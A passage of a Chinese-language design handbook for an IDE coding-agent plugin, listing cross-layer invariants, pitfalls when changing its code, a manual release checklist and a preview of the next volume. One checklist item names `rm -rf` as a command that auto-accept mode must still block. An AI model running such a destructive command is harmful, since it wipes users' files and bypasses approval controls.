| A5 | 版本号单一来源：`__version__` → `CORE_VERSION`，无手写字面量 | `test_version` |
| A6 | `ide/hello.capabilities` 是**整体替换**，`[]` 可清空 | `server.py:417-419` + `smoke_ask:208` |

#### B. 会话层

| # | 不变量 | 锁在哪 |
|---|---|---|
| B1 | `sessionId` 是壳给的字符串，Core 不解释；写文件时 `#` → `_` | `store.py:43-46`；无测试 |
| B2 | 落盘走 tmp + `os.replace`，不半写 | `store.py:122-126`；`test_session_store` 间接 |
| B3 | `MAX_MESSAGES = 240`，且截断后不留孤儿 `role=tool` | `store.py:106-111` + `test_session_store` |
| B4 | 删除中的会话不会被在跑的任务写回去 | `test_session_store.deleted_session_is_not_written_back_by_a_running_task` |
| B5 | 第一条用户消息生成标题，之后不再改 | `server.py:500-501` |

#### C. 上下文层（最容易静默出错）

| # | 不变量 | 锁在哪 |
|---|---|---|
| C1 | system 前缀在两轮之间**逐字不变**（否则 KV cache 全废） | `test_status` |
| C2 | `<agent_status>` 附在**最后一条 user 消息**之后，不新增消息、不进 transcript | `test_status` |
| C3 | 自检块只在第 2 轮起出现 | `test_status` |
| C4 | 同一工具重复调用上限 3 条警告 | `test_status` |
| C5 | 错误块截断到 400 字符以内 | `test_status` |
| C6 | 未知工具每次都带「可用工具」名单，到 `UNKNOWN_TOOL_LIMIT` 停回合 | `test_unknown_tool` |
| C7 | `ask_user` 独占一轮且先于其他工具 | `test_ask` |
| C8 | 子代理注册表重建：无 `subagent_dispatch`、无白名单外工具 | `test_subagent` + `smoke_subagent` |

#### D. 工具层

| # | 不变量 | 锁在哪 |
|---|---|---|
| D1 | `decide()` 三分类；空命令 `deny`；链式命令每段都要过 | `test_commands` |
| D2 | 自定义白名单**替换**默认；空列表回退内置 | `test_commands` |
| D3 | `permission` 字段逐字到达壳 | `smoke_command` |
| D4 | `deny` 的拒绝文案作为工具结果回给模型 | `smoke_command:183` |
| D5 | 只有写类工具（`write_file`/`edit_file`/`delete_file`/`revert_file`）受 `autoAcceptEdits` 惠及 | `ToolDispatcher.java:24-25,67-69` |
| D6 | MCP 工具名 `mcp__<server>__<tool>`，`auto_approve` 逐服务器 | `test_mcp` + `smoke_mcp` |
| D7 | Core 内置工具（记忆/待办/子代理）**绝不**发 `tool/invoke` | `smoke_memory` / `smoke_mcp` / `smoke_subagent` |

#### E. 存储层

| # | 不变量 | 锁在哪 |
|---|---|---|
| E1 | 检索结果必须与写入时的 embedding 标签匹配 | `test_codeindex.model_change_returns_no_hits` |
| E2 | 同标题记忆原地更新，不重复 | `test_memory` |
| E3 | 待确认候选不进记忆概览 | `test_memory_pending` |
| E4 | 未命中技能零注入（不占 token） | `test_skills` |
| E5 | 用量轮转不丢任何一行 | `test_usage` |
| E6 | 缺失 usage 字段保持 `None` 而非 `0` | `test_usage_totals` |

#### F. 超时漏斗（三个数字必须严格递增）

```
壳放弃：1.5s（InlineCompletionClient.get(1500, MILLISECONDS)）
  ↓
HTTP 读：8s（httpx.Timeout(read=8.0)）
  ↓
asyncio：12s（wait_for(..., timeout=12.0)）
```

三层都有兜底，所以任何一层出问题都不会把 stdin 循环卡死。
但有一件事没人管：**壳在 1.5s 放弃后，Core 仍会把这一轮算满 12s**，而结果发给了一个已经不再等它的
`reqId`（见 9.5 节）。

### 13.2 按改动面的易错点

#### 如果你改 Core（`core/src`）

1. **动 `messages` 的组装顺序** → 先跑 `test_status`，C1/C6 这两条最容易破。
2. **加一个新工具** → 记得同时考虑：(a) 它要不要进子代理白名单；(b) 要不要发 `tool/invoke`；(c) 参数要不要写 `--`。
3. **改 `store.py` 的文件格式** → `bench_core.seed_sessions` 会静默失效（12.13.4）。
4. **改子代理 system prompt 首句** → `smoke_subagent:39` 会静默失效。
5. **调记忆抽取启发式** → `smoke_v3:150` 会直接变红。
6. **加帧类型** → 必须同时想：它是通知（无 `id`）还是请求（有 `id`），错一个就等成超时。

#### 如果你改壳（`src/main/java` 或 `vscode/src`）

1. **动 `projectId` 算法** → 两个壳的数据全部失联，且是静默的（10.3）。
2. **传非 UTF-8 字节给 `write_file`** → Java 有 `FileText` 兜底，TS 没有，会直接烧文件。
3. **自绘 diff** → 别忘了 `MAX_DIFF_LINES = 800` 的上限与公共前后缀裁剪。
4. **改 `needsApproval` 逻辑** → 对照 `ToolDispatcher.java:69`，注意「`auto` 命令」与「`autoAcceptEdits`」是两件事。
5. **在 `git` 工具里拼参数** → 一定要 `--` 分隔符（Java `GitTools` 现在就缺）。

#### 如果你改协议（`core/src/agent_core/protocol.py`）

1. 改 `ChatConfig` 字段 → 别忘了 `server.py:427` 用 `model_fields.keys()` 过滤，
   新字段自动被接受；但从壳那侧不传也没关系（`merge` 到旧值）。
2. 改响应形状 → 两个壳的解析路径都要改（Java 逐层判 `ok/result/text`，TS 用 `response.result?.text`）。
3. 升 `PROTOCOL_VERSION` → 两壳都没有真正的版本兼容分支，实际上等于不兼容。

#### 如果你改测试

1. 别用 `assert` 写冒烟脚本，用 `failures.append`。
2. 别在需要「断言未发生」的地方用帧队列（12.2.3）。
3. 新冒烟脚本的 `--project-id` 与临时目录前缀必须唯一。

### 13.3 手工自测清单（自动化盖不到的部分）

这些都是「需要真 IDE、真 Swing、真文件系统」的项，每次发布前过一遍：

**启动与握手**
- [ ] 首次打开项目，面板显示「正在启动」，随后自动就绪（不报红）
- [ ] 在设置里把 Python 路径改错 → 报错可读（不是空白堆栈）
- [ ] 杀掉 python 进程 → 面板显示断开，能在不重启 IDE 的情况下重连

**对话**
- [ ] 发送中能看到增量 token，不是一次性刷出
- [ ] 点击停止 → 流立即停，已输出内容保留
- [ ] 长回答滚动不卡（列表虚拟化生效）
- [ ] 中文与 emoji 均不乱码（GBK 环境也要试）

**工具与审批**
- [ ] 写文件 → 弹 diff 卡片，接受后文件真的变了，拒绝后恢复原样
- [ ] 命令确认卡片显示完整命令行，长命令不截断
- [ ] 开启「自动接受修改」后：写文件不问，但 `rm -rf` 仍然被拦
- [ ] `ask_user` 卡片：单选/多选/自定义输入三条路径都能回传
- [ ] `ask_user` 未回答时关闭 IDE 再打开，会话不卡死

**会话管理**
- [ ] 新建/切换/删除会话，删除后重启 IDE 不再出现
- [ ] 会话搜索能找到十天前的中文对话
- [ ] 待确认记忆列表可批准/丢弃，批准后下次对话能被引用

**补全**
- [ ] 输入时 300ms 后出现灰字，继续输入会即时消失
- [ ] 超过 512KB 的文件不触发补全
- [ ] 自动补全开关关闭后完全不发 `inline/complete`

**并发与异常**
- [ ] 两个会话同时跑，事件不串台（`taskId` 对得上）
- [ ] 模型端点不可达 → 报错在气泡里，面板仍可继续用
- [ ] 断网一半 → 5 分钟内能恢复正常（不需要重启）

### 13.4 本卷覆盖与文件清单

```
第 09 卷覆盖范围（共 9,291 行）

节     覆盖对象                                    行数
──     ────────────────────────────────────────    ─────
§1–§4  vscode/src 前 4 个文件                          314
§5–§8  vscode/src 后 6 个文件（含 diff / inline）     2,197
§9     双壳交互细节（diff / inline）              ——（已计入上行）
§10    双壳能力对照（read-only 分析）              ——
§11    core/tests（27 个文件）                      4,112
§12    core/scripts（11 个文件）                    2,453
       vscode/scripts（2）+ tsconfig（1）             215
§13    跨层不变量与自测清单                        ——
```

几件必须记住的事：

1. **两个壳不共享数据**。`projectId` 算法不同 → 会话/记忆/索引全部各管各的。
2. **能力是「声明」不是「保证」**。`ide/hello.capabilities` 里写了什么，只能说明壳愿意接什么；VS Code 声明了 `ask-user` 却没有 `ask/user` 分支，结果就是空等 1800 s（§10.7）。
3. **编码只在 Java 侧被兜住**。TS 壳写文件时如果拿到非 UTF-8 字节，会直接写坏源码。
4. **单测锁语义，冒烟锁接线**。两者都不盖的，就是 13.3 那份手工清单。
5. **三层超时是漏斗不是闸门**。壳放弃了不等于 Core 停了。

### 13.5 第 10 卷预告：旧功能本体

到这一卷为止，讲的是 **Agent 子系统**（`com.workreport.agent` + `core` + `vscode`）。
但仓库名字是 `workreport`——它本来是一个「从 git 日志生成周报」的插件。第 10 卷回到本体，覆盖：

```
src/main/java/com/workreport/plugin/     11 个文件 / 约 2,340 行
├── model/GitCommitEntry.java                18   一条提交记录的不可变载体
├── privacy/PrivacyNoticeUtil.java           80   首次运行的隐私提示
├── service/GitLogCollectorService.java     282   git log 解析 → 按人/按日聚合
├── service/ReportPolishService.java        451   报告润色（直连 LLM，不经过 Core）
├── settings/ModelEndpoints.java             53   预设端点表
├── settings/ModelProfile.java               47   单个模型配置
├── settings/ModelProfiles.java             117   多配置管理（持久化）
├── settings/ReportSettingsConfigurable.java 381  设置页（Swing 表单）
├── settings/ReportSettingsState.java       133   PersistentStateComponent（设置持久化）
├── ui/ReportToolWindowFactory.java          23   ToolWindow 注册
└── ui/ReportToolWindowPanel.java           754   报告面板
```

那里有两条与 Agent 子系统完全不同的技术路线，值得对照看：

| 维度 | Agent 子系统（已讲） | 旧功能（第 10 卷） |
|---|---|---|
| 进程 | Python 子进程 + JSON-RPC | 纯 JVM，无外部进程 |
| 调用 LLM | 自己实现传输层 | `ReportPolishService` 直接 HTTP |
| 流式 | 有 | 大概率没有（一次性请求） |
| 敏感信息 | 靠工具权限控制 | 靠 `PrivacyNoticeUtil` 告知 |
| 设置 | `ReportSettingsState` 共享 | 同一份 State，两套字段 |

值得注意的是：**两套功能共用同一个 `ReportSettingsState`**（这也是 `ToolDispatcher` 能直接读到
`autoAcceptEdits` 的原因）。第 10 卷会从这个共享点入手，看清两套东西是怎么长在同一棵树上的。

---

<!-- ANCHOR -->
